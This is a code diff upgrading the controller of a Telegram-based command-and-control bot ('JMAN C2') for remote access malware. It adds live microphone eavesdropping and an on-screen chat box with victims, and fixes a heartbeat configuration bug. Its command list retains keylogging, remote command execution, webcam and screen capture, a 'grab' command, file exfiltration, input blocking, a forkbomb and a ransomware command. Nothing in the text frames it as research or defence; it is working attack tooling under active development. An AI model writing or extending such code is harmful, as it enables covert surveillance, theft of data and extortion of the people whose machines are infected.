@@ -1,9 +1,8 @@
-#
-# JMAN C2 Bot Controller - v2.0 (FIXED & UPGRADED)
-# - FIX: Fully functional /upload command that sends file data directly.
-# - FIX: /list command properly escapes all user-provided data to prevent Markdown errors.
-# - RETAINS: All previous functionality.
-#
+# app.py (Controller v2.1_UPGRADED)
+# - ADDED: New commands for Live Chat (/startchat, /sendchat, /stopchat) and Live Mic (/livemic, /stoplivemic)
+# - FIXED: Corrected typo in environment variable for HEARTBEAT_URL, which was breaking the /list command.
+# - RETAINS: All previous functionality and fixes.
+
 import os
 import re
 import json
@@ -20,12 +19,14 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.constants import ParseMode
 
 # --- Configuration ---
-# Load these from your environment variables on your server
+# Make sure these are set correctly in your server's environment
 TOKEN = os.getenv("TELEGRAM_TOKEN")
 SECRET_TOKEN = os.getenv("SECRET_TOKEN")
 JOBS_URL = os.getenv("JOBS_URL")
 STATE_URL = os.getenv("STATE_URL")
-HEARTBEAT_URL = os.getenv("HEARTBEATE_URL")
+# --- FIX: Corrected environment variable name from HEARTBEATE_URL ---
+HEARTBEAT_URL = os.getenv("HEARTBEAT_URL") 
+# --- END FIX ---
 
 # --- Initialize Flask and the Telegram Bot Application ---
 app = Flask(__name__)
@@ -97,12 +98,14 @@ async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
     agents.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
     
     response_text = "*ONLINE AGENTS*\n\n"
+    active_agent_found = False
     for agent in agents:
         is_selected = "🎯" if agent.get("id") == selected_target else "➖"
         last_seen_dt = datetime.fromtimestamp(agent.get("timestamp", 0))
         seconds_ago = int((datetime.now() - last_seen_dt).total_seconds())
         
         if seconds_ago > 90: continue # Skip agents not seen in the last 90 seconds
+        active_agent_found = True
 
         time_ago = f"{seconds_ago}s ago" if seconds_ago < 60 else f"{seconds_ago // 60}m ago"
         is_admin = "Admin" if agent.get("is_admin") else "User"
@@ -113,6 +116,9 @@ async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"   *Last Seen:* `{esc(time_ago)}`\n\n"
         )
     
+    if not active_agent_found:
+        response_text += "_No agents have checked in within the last 90 seconds\\._\n\n"
+
     response_text += "_Use `/target <id>` to select an agent\\._"
     await update.message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)
 
@@ -167,13 +173,9 @@ async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         doc = update.message.reply_to_message.document
         file = await doc.get_file()
         
-        # Download the file into memory
         file_content = await file.download_as_bytearray()
-        
-        # Encode file content to Base64 to safely send in JSON
         file_b64 = base64.b64encode(file_content).decode('utf-8')
 
-        # Prepare arguments for the job
         args_dict = {
             "filename": doc.file_name,
             "file_data_b64": file_b64
@@ -229,7 +231,14 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/livestream` \\- Start a live screen stream\n"
         "`/stoplivestream` \\- Stop the screen stream\n"
         "`/livecam` \\- Start a live webcam stream\n"
-        "`/stoplivecam` \\- Stop the webcam stream\n\n"
+        "`/stoplivecam` \\- Stop the webcam stream\n"
+        "`/livemic` \\- Start a live microphone audio stream\n"
+        "`/stoplivemic` \\- Stop the audio stream\n\n"
+
+        "*💬 LIVE INTERACTION*\n"
+        "`/startchat` \\- Open a chat box on the user's screen\n"
+        "`/sendchat <message>` \\- Send a message to the chat box\n"
+        "`/stopchat` \\- Close the chat box\n\n"
 
         "*🔊 AUDIO & VISUAL MISCHIEF*\n"
         "`/tts <male|female> <msg>` \\- Play Text\\-to\\-Speech\n"
@@ -252,6 +261,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "*📁 FILE SYSTEM*\n"
         "`/ls` \\- List files\n"
         "`/cd <dir>` \\- Change directory\n"
+        "`/pwd` \\- Show current directory\n"
         "`/download <file>` \\- Download a file from the agent\n"
         "`/upload` \\- Reply to a file to upload it to the agent\n\n"
         
@@ -277,16 +287,16 @@ ptb_app.add_handler(CommandHandler("upload", cmd_upload))
 
 agent_commands = [
     "info", "exec", "ss", "cam", "startkeylogger", "stopkeylogger", 
-    "livestream", "stoplivestream", "livecam", "stoplivecam",
+    "livestream", "stoplivestream", "livecam", "stoplivecam", "livemic", "stoplivemic",
     "grab", "ls", "cd", "download", "pwd",
     "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse",
     "forkbomb", "cancelforkbomb", "ransomware", "restore",
     "tts", "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen",
-    "startblocker", "stopblocker", "list" # Added list to be generic too
+    "startblocker", "stopblocker",
+    "startchat", "sendchat", "stopchat"
 ]
 for cmd in agent_commands:
-    # Ensure we don't overwrite specific handlers
-    if cmd not in ["help", "target", "destroy", "upload"]:
+    if cmd not in ["help", "target", "destroy", "upload", "list"]:
          ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
 
